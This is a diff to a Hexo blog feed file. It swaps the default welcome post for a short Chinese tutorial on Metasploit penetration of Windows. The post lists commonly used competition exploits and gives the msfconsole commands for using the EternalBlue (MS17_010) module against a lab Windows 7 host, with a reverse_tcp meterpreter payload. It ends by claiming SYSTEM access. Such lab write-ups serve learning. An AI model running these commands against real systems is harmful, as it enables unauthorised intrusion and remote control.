@@ -4,13 +4,19 @@
   
     
     <entry>
-      <title>Hello World</title>
-      <link href="/2019/12/05/hello-world/"/>
-      <url>/2019/12/05/hello-world/</url>
+      <title>Metasploit渗透</title>
+      <link href="/2019/12/06/Metasploit%E6%B8%97%E9%80%8F/"/>
+      <url>/2019/12/06/Metasploit%E6%B8%97%E9%80%8F/</url>
       
-        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">$ hexo server</span></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">$ hexo generate</span></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
+        <content type="html"><![CDATA[<hr><p>Windows渗透：</p><p>MS08_067，MS17_010，CVE-2017-7269，MS14_064，双脉冲星漏洞</p><p>这几个漏洞是在比赛中常用的，MS08_067最好是放在最后用，如果渗透失败需要重启靶机</p><p>通过MS17_010学习msf对渗透的利用：</p><p>​    靶机：Windows 7 （192.168.157.135）</p><p>​    攻击机：Kali （192.168.157.132）</p><p>1.使用-p-对靶机进行扫描，查看有哪些端口漏洞</p><p><img src="https://img.vim-cn.com/db/e190eb3c34d3688891f1a9a23ee3749d404023.png" alt="0"></p><p>2.输入msfconsole进入搜索MS17_010可利用漏洞模块</p><p><img src="https://img.vim-cn.com/b0/9e43fdcbbc88bf3211ce12ea5cc1bc9004bda1.png" alt="1"></p><p>3.利用漏洞模块，设置参数</p><p>msf5 &gt; use exploit/windows/smb/ms17_010_eternalblue</p><p>msf5 &gt; set RHOSTS 192.168.157.135</p><p>msf5 &gt; set payload windows/x64/meterpreter/reverse_tcp</p><p>msf5 &gt; set LHOST 192.168.157.132</p><p>msf5 &gt; exploit</p><p><img src="https://s2.ax1x.com/2019/12/06/QJQ19H.png" alt="3"></p><p>可以看到漏洞利用成功，现在是 system 最高权限,就可以对靶机进行为所欲为了</p>]]></content>
       
       
+      
+        <tags>
+            
+            <tag> 渗透 </tag>
+            
+        </tags>
       
     </entry>
     
